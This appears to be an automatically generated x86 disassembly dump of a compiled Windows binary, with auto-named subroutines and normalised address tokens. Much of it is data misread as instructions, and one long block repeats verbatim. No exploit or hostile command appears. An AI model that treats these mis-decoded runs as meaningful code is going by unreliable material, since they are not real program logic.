mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ ebp - 0x28 ]
lea edx [ ebp - 0x70 ]
mov esi [ eax ]
call [ esi + 0xd4 ]
call sub_46ba7c
mov eax [ ebp - 0x30 ]
test eax eax
jle r-xdata
push ebp
mov eax [ ebp - 0x28 ]
call sub_46e03c
pop ecx
add eax 0x5
sub [ ebp - 0x70 ] eax
sub [ ebp - 0x68 ] eax
mov cl 0x1
mov edx [ ebp - 0x2c ]
mov eax [ ebx ]
call sub_46dc58
jmp r-xdata
xor ecx ecx
mov edx eax
mov eax [ ebx ]
call sub_46dc58
jmp r-xdata
sub_46e47c
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ rw-data ]
mov ebx [ eax + 0x68 ]
test ebx ebx
je r-xdata
mov eax edi
mov edx [ esi + 0x50 ]
call sub_403f74
cmp [ ebx + 0x23c ] 0x0
je r-xdata
mov eax edi
mov edx [ ebx + 0x23c ]
call sub_403f74
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_46e4b8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx ecx
mov [ esp ] edx
mov esi eax
mov eax [ rw-data ]
mov edi [ eax + 0x6c ]
test edi edi
je r-xdata
mov ebp [ esi + 0x44 ]
cmp edi ebp
je r-xdata
push ebx
xor ecx ecx
mov edx [ esp + 0x4 ]
mov eax edi
call sub_44e340
dec eax
je r-xdata
xor eax eax
jmp r-xdata
test ebp ebp
je r-xdata
mov al 0x1
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x0
jne r-xdata
push ebx
xor ecx ecx
mov edx [ esp + 0x4 ]
mov eax ebp
call sub_44e340
dec eax
je r-xdata
mov al [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ ebx + 0x60 ] 0x0
je r-xdata
cmp [ ebx + 0x42 ] 0x0
setne dl
mov eax ebx
call sub_459c50
sub_46e548
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0xc2 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0xc4 ]
call [ ebx + 0xc0 ]
sub_46e570
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0xca ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0xcc ]
call [ ebx + 0xc8 ]
sub_46e614
add [ eax ] eax
add [ eax ] al
test [ esi + 0x47 ] ch
add [ eax - 0x6b ] dh
inc esp
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_46e677
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e67e
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_4640c4
mov eax sub_464344
call sub_417e18
mov eax [ rw-data ]
push eax
call CloseHandle
sub_46e720
cld
cmc
inc esi
add [ edx + edi * 8 + 0x44 ] bh
add [ edi + ecx * 8 + 0x44 ] dh
add ah bl
push cs
inc edx
add ah al
or eax [ edx ]
mov esp 0xe400420b
push cs
inc edx
add al bl
hlt
sub_46e766
inc esp
add [ esp + esi * 8 + 0x44 ] al
add [ edi + ecx * 8 + 0x44 ] bl
add [ ebp + eax * 8 - 0x2f17ffbc ] dl
inc esp
add [ eax - 0x30 ] ah
inc esp
add [ ebx + edx * 8 + 0x44 ] dh
add [ eax ] ah
rol [ eax + eax - 0x64 ] cl
adc al 0x45
add al cl
hlt
sub_46ea6f
mov esp 0x100453c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb eax [ eax ]
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push ds
add [ edi ] al
push esi
imul esi [ ebx + 0x69 ] 0x74656c62
sub eax [ edx ]
mov eax 0xc40046f9
stc
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5507001c ] al
jo r-xdata
jae r-xdata
insb
jns r-xdata
dec edi
push edi
inc ecx
add [ eax ] ah
add al [ eax ]
jmp [ eax ]
bound ebp [ ebp + 0x74 ]
add [ eax + eax - 0x18 ] 0x0
add bh bh
call 0x245eb26
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0020 ] al
outsb
inc esp
jb r-xdata
push r-xdata
sbb al 0xfa
inc esi
add [ eax ] ch
cli
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb eax 0x70550b00
dec esi
jne r-xdata
add [ eax ] al
dec edi
jbe r-xdata
add [ eax ] 0x0
add [ eax + 0x4f090023 ] al
outsb
inc esp
jb r-xdata
popad
inc edi
insb
jns r-xdata
push ebx
je r-xdata
jb r-xdata
outsb
inc ebp
outsb
je r-xdata
jb r-xdata
push ebx
je r-xdata
je r-xdata
add [ eax + 0x4f070024 ] al
push edi
jo r-xdata
outsb
add [ eax + eax - 0x10 ] 0x0
add bh bh
[ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0021 ] al
push 0x40100073
add [ edi ] dl
add bh bh
lodsb [ esi ]
rol [ eax + eax + 0x8 ] 0x1
inc esp
add [ eax ] al
or [ edx ] al
in al dx
jb r-xdata
sbb [ edx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] al
or [ edi + 0x6e ] ecx
push edi
inc ecx
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060025 ] al
outsb
inc ebp
js r-xdata
jb r-xdata
inc ebp
outsb
inc esp
add [ eax + eax + 0x8 ] 0x1
add bh bh
or [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and al [ eax ]
or [ edi + 0x6e ] ecx
inc ebp
outsb
inc esp
outsd
arpl [ ebx + 0x44 ] bp
add [ eax + eax + 0x18 ] 0x1
add bh bh
sbb [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax [ eax ]
or [ edi + 0x6e ] ecx
xor eax [ eax ]
call 0x284730c2
add al ah
in eax dx
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x2dffb913 ] ah
in eax dx
inc esi
add [ edx + eax ] dh
jb r-xdata
add [ eax + 0x4f0b0026 ] al
outsb
inc ecx
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
inc esp
jb r-xdata
add [ eax ] al
and [ ecx ] 0x0
or cl [ edi + 0x6e ]
or eax 0x8a840045
inc ecx
add [ eax - 0xe ] cl
inc esp
add [ esi + eax * 8 + 0x44 ] bl
add [ edx + edi * 8 + 0x44 ] bh
add [ edi + ecx * 8 + 0x44 ] dh
add ah bl
push cs
inc edx
add ah al
or eax [ edx ]
mov esp 0xe400420b
push cs
inc edx
add [ edx + edi * 8 + 0x40b40046 ] dh
inc ebp
add al dl
inc ebp
inc ebp
add [ eax * 2 - 0x3b2fffbb ] bl
inc esp
add [ eax ] dh
cmp eax [ ebp ]
push eax
cmp eax [ ebp ]
push 0x18004538
les eax [ eax + eax + 0x1c ]
les eax [ eax + eax + 0x18 ]
hlt
inc esi
add [ eax - 0x37ffbabb ] ah
inc esp
jb r-xdata
xor [ eax ] eax
inc esp
xor [ eax ] eax
mov eax 0xa00046fb
inc ebp
inc ebp
add al cl
and [ eax + eax + 0x28 ] eax
insb
imul esp [ ebx + 0x6b ] 0xecacc08b
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push ebp
jo r-xdata
outsb
je r-xdata
add [ eax ] al
test ch bl
inc ebx
add ah al
push cs
inc edx
add ah ah
xor eax [ eax ]
sbb [ eax ] cl
inc edx
add ah ch
xor al 0x2
inc esp
outsd
arpl [ ebx - 0x4 ] bp
add [ eax + eax + 0x10 ] 0x1
add bh bh
adc [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
daa
add [ ebx ] cl
dec edi
outsb
inc eax
add al ch
je r-xdata
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
test [ eax + eax ] eax
add [ eax ] bl
inc ecx
add [ eax ] bl
add al [ eax ]
[ eax ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090028 ] al
sub_46ee90
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0010 ] al
outsd
outsb
jae r-xdata
add bh bh
xor [ edx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
jb r-xdata
outsb
je r-xdata
outsb
popad
bound ebp [ ebp + 0x64 ]
add [ eax ] dl
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
adc al 0x0
or eax 0x74696445
outsd
jb r-xdata
adc eax [ eax ]
or [ edx + esi * 2 + 0x61 ] al
dec ebp
outsd
add [ gs : eax ] dl
inc eax
add [ eax ] dh
add al [ eax ]
push [ eax ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp - 0x3700ffff ] ah
cmp eax [ ebp ]
in al dx
cmp eax [ ebp ]
add [ eax ] al
add [ eax - 0x80000000 ] al
adc [ eax ] eax
add eax 0x336c7443
inc esp
hlt
add [ ecx ] cl
dec ebp
popad
adc [ eax ] al
sub [ edx ] al
add bh bh
sub [ edx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
pop ss
add [ ecx ] cl
dec ecx
outsb
arpl [ edx + 0x65 ] si
insd
outsb
je r-xdata
adc [ eax ] al
pop edx
add [ eax ] al
call [ eax - 0x2d ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb eax [ eax ]
or edx [ eax + 0x61 ]
jb r-xdata
outsb
je r-xdata
add [ eax ] cl
dec ebp
popad
js r-xdata
adc [ eax ] al
or [ edx ] al
add bh bh
sbb [ ebx ] bl
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb [ eax ] al
or [ ebp + 0x61 ] ecx
add [ ecx ] 0x0
add [ eax ] al
push ds
add [ esi ] cl
outsb
je r-xdata
outsd
insb
outsd
jb r-xdata
js r-xdata
cmp al 0x10
inc eax
add [ edx + eax ] ah
add bh bh
and al 0x2
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb [ eax ] eax
or [ ebp + 0x61 ] cl
cmp eax [ ebp ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
popad
insb
jne r-xdata
add [ eax ] al
add [ eax + 0x53080021 ] al
push 0x6948776f
outsb
je r-xdata
outsb
je r-xdata
add [ edx ] cl
push eax
popad
adc [ eax ] al
test eax 0xf8ff0001
add [ eax ] al
add [ eax - 0x80000000 ] al
pop ds
add [ ecx ] cl
push eax
outsb
je r-xdata
jb r-xdata
popad
cmp al 0x10
inc eax
add [ eax ] ah
add al [ eax ]
jmp [ eax ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
jle r-xdata
add [ eax ] al
push 0x6948776f
outsb
je r-xdata
and [ eax ] al
or [ edx + 0x65 ] dl
popad
dec edi
outsb
insb
jns r-xdata
add [ eax ] al
outsb
je r-xdata
jo r-xdata
push eax
popad
jb r-xdata
push cs
je r-xdata
adc [ eax ] al
cdq
inc eax
add [ eax + 0x180046ff ] dl
add [ edi ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax [ eax ]
add eax 0x756c6156
add [ gs : eax ] dl
inc eax
add [ edi ] dl
add bh bh
lodsb [ esi ]
rol [ eax + eax + 0x8 ] 0x1
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and al 0x0
pop es
push esi
imul esi [ ebx + 0x69 ] 0x74656c62
push edi
add [ esp + edi ] ah
sbb al 0x0
or edx [ eax + 0x61 ]
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
outsd
enter 0x45 0x7c
add [ eax ] al
inc [ ecx + edx * 8 + 0x44 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5009001f ] al
jo r-xdata
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
inc ebp
add [ esp + edi + 0x10045 ] ah
add [ eax ] al
add [ eax ] al
add [ eax - 0x1 ] al
and al [ eax ]
or [ ecx + 0x62 ] dl
dec edi
jb r-xdata
and al 0x3c
outsb
jne r-xdata
jb r-xdata
xor eax [ eax + eax + 0x10 ]
inc eax
add [ ecx ] bl
add bh bh
mov eax 0x10044d2
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb eax 0x61500a00
add [ eax - 0x80000000 ] al
sub [ eax ] al
or cl [ edi + 0x6e ]
inc ecx
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
insb
je r-xdata
jb r-xdata
adc [ eax ] al
0xff0000 0x44d3
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
push cs
add al [ eax ]
call [ esp + ebx + 0x44 ]
add [ eax ] 0x0
add [ eax + 0x4f07002b ] al
outsb
inc ebp
outsb
je r-xdata
inc esp
jb r-xdata
inc esp
jb r-xdata
add [ eax ] al
add [ eax + 0x4f0a0027 ] al
outsb
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe945f209
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0028 ] al
outsb
inc ecx
add [ eax ] bl
add al [ eax ]
[ eax ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080025 ] al
outsb
inc ebx
push 0x65676e61
je r-xdata
adc [ eax ] al
movsb [ edi ] [ esi ]
add [ eax ] eax
jns r-xdata
jb r-xdata
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jo r-xdata
fadd [ eax ]
jb r-xdata
inc [ ecx ]
push edi
inc ecx
jns r-xdata
je r-xdata
add [ eax ] al
sub [ ecx ] 0x0
or cl [ edi + 0x6e ]
inc esp
jb r-xdata
add [ eax + eax - 0x10 ] 0x0
add bh bh
[ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0029 ] al
inc esi
add [ eax - 0x4bffffff ] dl
push ss
inc ebx
add ah al
push cs
inc edx
add ah ah
xor eax [ eax ]
sbb [ eax ] cl
inc edx
add ah ch
xor eax [ eax ]
mov al [ 0x280044e5 ]
xor [ eax ] eax
inc esp
xor [ eax ] eax
dec ebp
outsd
jbe r-xdata
dec ebp
outsd
jne r-xdata
dec edi
jae r-xdata
loopne r-xdata
jo r-xdata
outsb
add [ edx ] cl
dec edi
add [ eax + eax - 0x28 ] 0xd8ff0001
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06002c ] al
outsb
inc ebp
dec edi
jbe r-xdata
add [ eax ] al
add [ eax - 0x61ffb90c ] dl
hlt
mov al 0x80
inc esp
add al ah
add [ eax ] al
jmp eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07002f ] al
mov [ ecx + 0x1e80044 ] es
add bh bh
call 0x245f308
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor al [ eax ]
or [ edi + 0x6e ] ecx
dec ebp
outsd
jne r-xdata
outsb
add [ eax + eax - 0x30 ] 0x0
add bh bh
rol [ eax ] 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] al
or ecx [ edi + 0x6e ]
dec ebp
outsd
jne r-xdata
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
js r-xdata
jb r-xdata
rol [ eax ] 0x47
add [ eax + 0x780044f2 ] al
out 0x44 al
add [ edx + ecx * 4 + 0x33d80041 ] al
inc ebx
add [ esi + eax * 8 + 0x44 ] bl
push ebp
jo r-xdata
popad
inc esp
outsd
ja r-xdata
outsb
add [ eax + eax - 0x28 ] 0xd8ff0000
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0031 ] al
fadd [ ecx + 0x1e00044 ]
add bh bh
loopne r-xdata
add [ eax + eax + 0x18 ] 0x1
add bh bh
sbb [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al [ eax ]
or [ edi + 0x6e ] ecx
inc ebp
outsb
inc esp
jb r-xdata
add [ eax + eax + 0x10 ] 0x1
add bh bh
adc [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor eax [ eax ]
or ecx [ edi + 0x6e ]
push ebx
je r-xdata
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] eax
or ecx [ edi + 0x6e ]
sub [ ecx + 0xd80044 ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a002e ] al
outsb
dec ebx
jns r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ cs : edx ] cl
dec edi
dec ebx
jns r-xdata
je r-xdata
xor eax [ ebx ]
pop esp
mov [ eax + eax - 0x38 ] 0xc5
inc esp
add [ edi + ecx * 8 + 0x44 ] dh
add ah bl
push cs
inc edx
add ah al
or eax [ edx ]
mov esp 0xe400420b
push cs
jb r-xdata
add [ eax + 0x4f09002d ] al
inc ecx
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al cl
hlt
add [ ecx ] cl
inc esp
add ah bl
loope r-xdata
inc edx
add [ esi + ebp + 0x43 ] al
add [ eax ] dl
loope r-xdata
inc edx
add [ ebx + ecx + 0xee40042 ] bh
inc esp
jb r-xdata
add ah dl
salc
inc esp
add [ eax - 0x39 ] cl
inc esp
add [ esi + edx * 8 + 0x2200044 ] dh
inc edi
add [ edx ] al
add ch dl
call ebx
push esp
add [ edi ] al
insb
add [ edi ] eax
adc [ esp + edx * 2 + 0x69 ] edx
insd
jb r-xdata
add al dl
les eax [ eax + eax + 0x14 ]
int3
add al cl
lds eax [ eax + eax + 0x74 ]
iretd
inc esp
mov eax eax
add ah dh
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + esi * 8 + 0x46 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
hlt
shl [ ebx ] 0x1
inc esi
push eax
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
call sub_43c850
call sub_43c930
jo r-xdata
mov eax esi
call sub_46f598
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
aam 0xfc
inc [ eax + eax * 8 - 0x6b5ef28c ]
cmc
inc esi
add bh dh
shl [ ebx ] 0x1
inc esi
push eax
inc edx
jne r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
je r-xdata
outsb
mov ah 0xf4
inc esi
add [ edi ] al
adc [ esp + edx * 2 + 0x69 ] edx
insd
jb r-xdata
test al al
je r-xdata
jo r-xdata
jo r-xdata
inc edx
jne r-xdata
mov [ esi + 0x208 ] eax
mov eax esi
call sub_46f598
add [ eax ] al
xor edx edx
mov eax esi
call sub_46fa40
mov edx 0x14
mov eax esi
call sub_44c948
mov edx 0x19
mov eax esi
call sub_44c96c
mov eax [ esi + 0x208 ]
mov [ esi + 0x210 ] eax
mov eax esi
test bl bl
je r-xdata
add al [ eax ]
add [ ebx ] dh
ror [ ebx + 0x480e8c6 ] cl
add [ eax ] al
je r-xdata
mov [ esi + 0x20c ] eax
xor edx edx
mov eax esi
call sub_46f9c4
outsb
add ah dh
inc esi
add [ eax ] al
sbb [ ebx ] al
daa
add [ ebx + edx * 2 ] al
jo r-xdata
outsb
add [ eax ] al
sub_46f1c6
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070026 ] al
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
sub [ ecx ] al
add bh bh
sub [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
daa
add [ edx ] cl
dec edi
outsb
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe945f209
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0028 ] al
outsb
inc esp
jb r-xdata
add [ eax ] 0x0
add [ eax + 0x4f07002b ] al
outsb
inc ebp
outsb
je r-xdata
inc esp
jb r-xdata
jns r-xdata
jb r-xdata
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jo r-xdata
fadd [ eax ]
jb r-xdata
inc [ ecx ]
push edi
inc ecx
jns r-xdata
je r-xdata
add [ eax ] al
sub [ ecx ] 0x0
or cl [ edi + 0x6e ]
inc esp
jb r-xdata
add [ eax + eax - 0x10 ] 0x0
add bh bh
[ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0029 ] al
inc esi
add [ eax - 0x4bffffff ] dl
push ss
inc ebx
add ah al
push cs
inc edx
add ah ah
xor eax [ eax ]
sbb [ eax ] cl
inc edx
add ah ch
xor eax [ eax ]
mov al [ 0x280044e5 ]
xor [ eax ] eax
inc esp
xor [ eax ] eax
dec ebp
outsd
jbe r-xdata
dec ebp
outsd
jne r-xdata
dec edi
jae r-xdata
loopne r-xdata
jo r-xdata
outsb
add [ edx ] cl
dec edi
add [ eax + eax - 0x28 ] 0xd8ff0001
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06002c ] al
outsb
inc ebp
dec edi
jbe r-xdata
add [ eax ] al
add [ eax - 0x61ffb90c ] dl
hlt
mov al 0x80
inc esp
add al ah
add [ eax ] al
jmp eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07002f ] al
mov [ ecx + 0x1e80044 ] es
add bh bh
call 0x245f308
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor al [ eax ]
or [ edi + 0x6e ] ecx
dec ebp
outsd
jne r-xdata
outsb
add [ eax + eax - 0x30 ] 0x0
add bh bh
rol [ eax ] 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] al
or ecx [ edi + 0x6e ]
dec ebp
outsd
jne r-xdata
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
js r-xdata
jb r-xdata
rol [ eax ] 0x47
add [ eax + 0x780044f2 ] al
out 0x44 al
add [ edx + ecx * 4 + 0x33d80041 ] al
inc ebx
add [ esi + eax * 8 + 0x44 ] bl
push ebp
jo r-xdata
popad
inc esp
outsd
ja r-xdata
outsb
add [ eax + eax - 0x28 ] 0xd8ff0000
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0031 ] al
fadd [ ecx + 0x1e00044 ]
add bh bh
loopne r-xdata
add [ eax + eax + 0x18 ] 0x1
add bh bh
sbb [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al [ eax ]
or [ edi + 0x6e ] ecx
inc ebp
outsb
inc esp
jb r-xdata
add [ eax + eax + 0x10 ] 0x1
add bh bh
adc [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor eax [ eax ]
or ecx [ edi + 0x6e ]
push ebx
je r-xdata
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] eax
or ecx [ edi + 0x6e ]
sub [ ecx + 0xd80044 ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a002e ] al
outsb
dec ebx
jns r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ cs : edx ] cl
dec edi
dec ebx
jns r-xdata
je r-xdata
xor eax [ ebx ]
pop esp
mov [ eax + eax - 0x38 ] 0xc5
inc esp
add [ edi + ecx * 8 + 0x44 ] dh
add ah bl
push cs
inc edx
add ah al
or eax [ edx ]
mov esp 0xe400420b
push cs
jb r-xdata
add [ eax + 0x4f09002d ] al
inc ecx
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al cl
hlt
add [ ecx ] cl
inc esp
add ah bl
loope r-xdata
inc edx
add [ esi + ebp + 0x43 ] al
add [ eax ] dl
loope r-xdata
inc edx
add [ ebx + ecx + 0xee40042 ] bh
inc esp
jb r-xdata
add ah dl
salc
inc esp
add [ eax - 0x39 ] cl
inc esp
add [ esi + edx * 8 + 0x2200044 ] dh
inc edi
add [ edx ] al
add ch dl
call ebx
push esp
add [ edi ] al
insb
add [ edi ] eax
adc [ esp + edx * 2 + 0x69 ] edx
insd
jb r-xdata
add al dl
les eax [ eax + eax + 0x14 ]
int3
add al cl
lds eax [ eax + eax + 0x74 ]
iretd
inc esp
mov eax eax
add ah dh
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + esi * 8 + 0x46 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
hlt
shl [ ebx ] 0x1
inc esi
push eax
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
call sub_43c850
call sub_43c930
jo r-xdata
mov eax esi
call sub_46f598
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
aam 0xfc
inc [ eax + eax * 8 - 0x6b5ef28c ]
cmc
inc esi
add bh dh
shl [ ebx ] 0x1
inc esi
push eax
inc edx
jne r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
je r-xdata
outsb
mov ah 0xf4
inc esi
add [ edi ] al
adc [ esp + edx * 2 + 0x69 ] edx
insd
jb r-xdata
test al al
je r-xdata
jo r-xdata
jo r-xdata
inc edx
jne r-xdata
mov [ esi + 0x208 ] eax
mov eax esi
call sub_46f598
add [ eax ] al
xor edx edx
mov eax esi
call sub_46fa40
mov edx 0x14
mov eax esi
call sub_44c948
mov edx 0x19
mov eax esi
call sub_44c96c
mov eax [ esi + 0x208 ]
mov [ esi + 0x210 ] eax
mov eax esi
test bl bl
je r-xdata
add al [ eax ]
add [ ebx ] dh
ror [ ebx + 0x480e8c6 ] cl
add [ eax ] al
je r-xdata
mov [ esi + 0x20c ] eax
xor edx edx
mov eax esi
call sub_46f9c4
outsb
add ah dh
inc esi
add [ eax ] al
sbb [ ebx ] al
daa
add [ ebx + edx * 2 ] al
jo r-xdata
outsb
add [ eax ] al
sub_46f456
inc esp
add [ esp + esi * 8 + 0x44 ] al
add [ edi + ecx * 8 + 0x44 ] bl
add [ ebp + eax * 8 - 0x2f17ffbc ] dl
inc esp
